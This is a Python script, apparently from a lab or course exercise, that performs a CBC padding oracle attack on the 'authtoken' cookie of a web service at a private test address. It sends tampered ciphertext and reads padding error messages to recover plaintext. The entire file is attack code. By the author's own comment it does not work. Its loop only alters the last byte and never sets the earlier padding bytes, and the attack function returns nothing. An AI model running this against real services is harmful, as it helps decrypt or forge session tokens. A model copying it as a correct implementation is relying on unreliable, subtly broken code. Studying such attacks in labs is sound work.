import requests
import secrets

basepath = 'http://10.0.2.2:5000'
quotepath = basepath + '/quote'

#Based on https://robertheaton.com/2013/07/29/padding-oracle-attack/
#Might be overcomplicating it, at least it does not seem to work as expected.

def extractTokenFrom(response):
    tokenHeader = response.cookies.get('authtoken')
    #print(tokenHeader.decode())
    return tokenHeader

def askPaddingOracle(ciphertext):
    cookies = {'authtoken': ciphertext.hex()}
    response = requests.get(quotepath, cookies = cookies)
    return response

def runPOAttack(ciphertext):
    cipherbytes = (bytes.fromhex(ciphertext))

    cipherblock1 = bytearray(cipherbytes[0:16])
    cipherblock2 = bytearray(cipherbytes[16:32])
    cipherblock3 = bytearray(cipherbytes[32:48])
    cipherblock4 = bytearray(cipherbytes[48:])

    #print(cipherblock1)
    #print(cipherblock2)
    #print(cipherblock3)
    #print(cipherblock4)

    i2 = bytearray(16)
    c1 = cipherblock3
    c2 = cipherblock4

    for byteindex in range(15,-1,-1):
        c1dot = bytearray(16)
        #for value in range(14, byteindex-1, -1):
         #   c1dot[value] = 0

        for value in range(0,256):
            c1dot[15] = value

            response = askPaddingOracle(c1dot + c2)
            if 'padding is incorrect' not in response.text.lower():
                c1dotvalue = value
                p2dotvalue = (0 + (16 - byteindex))
                i2[byteindex] = c1dotvalue ^ p2dotvalue
                print(c1dot)
                print(i2)
                break
            else:
                continue

    p2 = bytearray(16)

    for value in range(0,16):
        p2[value] = c1[value] ^ i2[value]

    print(p2.decode('utf-8', 'ignore'))
    #print(p2)
    #print(p2.decode('utf-8', 'ignore'))


    #c2 = bytearray(cipherbytes[48:])
    #c1 = bytearray(cipherbytes[32:48])

    #c1_ = bytearray(secrets.token_bytes(16))

    #i2 = bytearray(16)
    #p2_ = bytearray(16)

    #Decrypt first byte
    #for value in range(0,255):
    #    c1_[15] = value
    #    concatenated = c1_ + c2
    #    response = askPaddingOracle(concatenated)
    #    if 'padding is incorrect' not in response.text.lower():
    #
    #
    #        break
    ##    else:
     #       continue

def main():
    ciphertext = extractTokenFrom(requests.get(basepath))
    secret = runPOAttack(ciphertext)


if __name__ == "__main__":
    main()